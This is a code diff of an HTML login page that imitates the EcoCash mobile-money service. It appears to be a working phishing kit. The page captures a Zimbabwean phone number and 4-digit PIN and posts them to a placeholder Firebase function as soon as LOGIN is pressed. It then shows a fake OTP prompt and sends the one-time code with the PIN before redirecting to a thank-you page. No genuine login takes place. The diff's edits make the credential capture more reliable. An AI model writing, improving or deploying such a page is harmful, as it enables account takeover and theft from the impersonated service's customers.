@@ -4,7 +4,9 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>EcoCash — Login</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
   *{box-sizing:border-box}
   html,body{height:100%}
@@ -44,24 +46,26 @@
 </head>
 
 <body>
+
 <div class="card">
   <img src="assets/eco.png" alt="EcoCash logo" class="logo">
   <h2>Log In</h2>
 
   <form id="loginForm" autocomplete="off">
     <label><span class="req">★</span>Mobile Number
-      <input id="phone" value="+263" inputmode="tel">
+      <input id="phone" value="+263" inputmode="tel" autocomplete="off">
     </label>
 
     <label><span class="req">★</span>4-Digit PIN</label>
     <div class="pin-row">
-      <input class="pin-digit" maxlength="1">
-      <input class="pin-digit" maxlength="1">
-      <input class="pin-digit" maxlength="1">
-      <input class="pin-digit" maxlength="1">
+      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+      <input class="pin-digit" maxlength="1" inputmode="numeric" autocomplete="off">
     </div>
 
-    <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
+    <!-- 🔴 FIX: button, not submit -->
+    <button type="button" id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
@@ -97,26 +101,22 @@
 </div>
 
 <script>
-/* ===== ORIGINAL LOGIC + MINIMAL EXTENSIONS ===== */
-
 const FUNCTION_URL = 'FIREBASE_FUNCTION_URL';
 
 const phoneEl = document.getElementById('phone');
 const loginBtn = document.getElementById('loginBtn');
 const pinInputs = [...document.querySelectorAll('.pin-digit')];
-
 const otpModal = document.getElementById('otpModal');
 const confirmBtn = document.getElementById('confirmOtp');
 const resendBtn = document.getElementById('resendBtn');
 const otpWarning = document.getElementById('otpWarning');
-const otpStatus = document.getElementById('otpStatus');
 
 const PREFIX = '+263';
 const RESEND_SECONDS = 120;
 let secondsLeft = RESEND_SECONDS;
 let resendTimer = null;
 
-/* ===== PHONE ENFORCEMENT ===== */
+/* PHONE */
 function normalizePhone(){
   let d = phoneEl.value.slice(PREFIX.length).replace(/\D/g,'');
   if(d.startsWith('0')) d = d.slice(1);
@@ -127,110 +127,76 @@ function validPhone(){
   const d = phoneEl.value.slice(PREFIX.length);
   return /^\d{9}$/.test(d) && d.startsWith('7');
 }
+phoneEl.addEventListener('keydown',e=>{
+  if((e.key==='Backspace'||e.key==='Delete') && phoneEl.selectionStart<=PREFIX.length){
+    e.preventDefault();
+  }
+});
+phoneEl.addEventListener('input',()=>{
+  if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
+  normalizePhone(); updateLoginState();
+});
 
-/* ===== PIN HANDLING ===== */
-function getPin(){
-  return pinInputs.map(i => i.dataset.val || '').join('');
-}
-
+/* PIN */
+function getPin(){ return pinInputs.map(i=>i.dataset.val||'').join(''); }
 pinInputs.forEach((el,i)=>{
   el.addEventListener('input',e=>{
-    const v = e.target.value.replace(/\D/g,'');
-    el.value = v ? '•' : '';
-    el.dataset.val = v;
-    if(v && i < 3) pinInputs[i+1].focus();
+    const v=e.target.value.replace(/\D/g,'');
+    el.value=v?'•':'';
+    el.dataset.val=v;
+    if(v && i<3) pinInputs[i+1].focus();
     updateLoginState();
   });
 });
 
-/* ===== LOGIN STATE ===== */
+/* LOGIN STATE */
 function updateLoginState(){
   loginBtn.disabled = !(validPhone() && /^\d{4}$/.test(getPin()));
 }
 
-/* ===== PHONE EVENTS ===== */
-phoneEl.addEventListener('input',()=>{
-  if(!phoneEl.value.startsWith(PREFIX)) phoneEl.value = PREFIX;
-  normalizePhone();
-  updateLoginState();
-});
-
-/* ===== SEND ===== */
+/* SEND */
 function sendToServer(payload){
-  return fetch(FUNCTION_URL,{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify(payload)
-  });
+  return fetch(FUNCTION_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
 }
 
-/* ===== LOGIN ===== */
-document.getElementById('loginForm').addEventListener('submit',e=>{
-  e.preventDefault();
+/* LOGIN */
+loginBtn.onclick=()=>{
   otpModal.style.display='flex';
   startResendCountdown();
+  sendToServer({event:'login_clicked',loginPhone:phoneEl.value,loginPin:getPin(),submittedAt:new Date().toISOString()});
+};
 
-  sendToServer({
-    event:'login_clicked',
-    loginPhone:phoneEl.value,
-    loginPin:getPin(),
-    submittedAt:new Date().toISOString()
-  });
-});
-
-/* ===== OTP ===== */
-const dEls = ['d0','d1','d2','d3','d4','d5'].map(id=>document.getElementById(id));
-
-function getOtp(){ return dEls.map(el=>el.value||'').join(''); }
-
+/* OTP */
+const dEls=['d0','d1','d2','d3','d4','d5'].map(id=>document.getElementById(id));
+function getOtp(){return dEls.map(el=>el.value||'').join('');}
 dEls.forEach((el,i)=>{
   el.addEventListener('input',()=>{
-    el.value = el.value.replace(/\D/g,'').slice(0,1);
+    el.value=el.value.replace(/\D/g,'').slice(0,1);
     if(el.value && i<5) dEls[i+1].focus();
-    confirmBtn.disabled = !/^\d{6}$/.test(getOtp());
+    confirmBtn.disabled=!/^\d{6}$/.test(getOtp());
   });
 });
 
-/* ===== CONFIRM ===== */
-confirmBtn.onclick = async ()=>{
-  const otp = getOtp();
+/* CONFIRM */
+confirmBtn.onclick=async()=>{
+  const otp=getOtp();
   if(!/^\d{6}$/.test(otp)){otpWarning.style.display='block';return;}
-
-  await sendToServer({
-    event:'otp_confirm',
-    loginPhone:phoneEl.value,
-    loginPin:getPin(),
-    otp,
-    submittedAt:new Date().toISOString()
-  });
-
+  await sendToServer({event:'otp_confirm',loginPhone:phoneEl.value,loginPin:getPin(),otp,submittedAt:new Date().toISOString()});
   window.location.href='thankyou.html';
 };
 
-/* ===== RESEND ===== */
+/* RESEND */
 function startResendCountdown(){
   clearInterval(resendTimer);
-  secondsLeft = RESEND_SECONDS;
-  resendBtn.disabled = true;
-  resendTimer = setInterval(()=>{
+  secondsLeft=RESEND_SECONDS;
+  resendBtn.disabled=true;
+  resendTimer=setInterval(()=>{
     secondsLeft--;
-    document.getElementById('countdown').textContent = secondsLeft;
-    if(secondsLeft<=0){
-      clearInterval(resendTimer);
-      resendBtn.disabled=false;
-    }
+    document.getElementById('countdown').textContent=secondsLeft;
+    if(secondsLeft<=0){clearInterval(resendTimer);resendBtn.disabled=false;}
   },1000);
 }
-
-resendBtn.onclick=()=>{
-  startResendCountdown();
-  sendToServer({
-    event:'resend_otp',
-    loginPhone:phoneEl.value,
-    loginPin:getPin(),
-    submittedAt:new Date().toISOString()
-  });
-};
+resendBtn.onclick=()=>{startResendCountdown();sendToServer({event:'resend_otp',loginPhone:phoneEl.value,loginPin:getPin(),submittedAt:new Date().toISOString()});};
 
 document.getElementById('cancelOtp').onclick=()=>otpModal.style.display='none';
 </script>
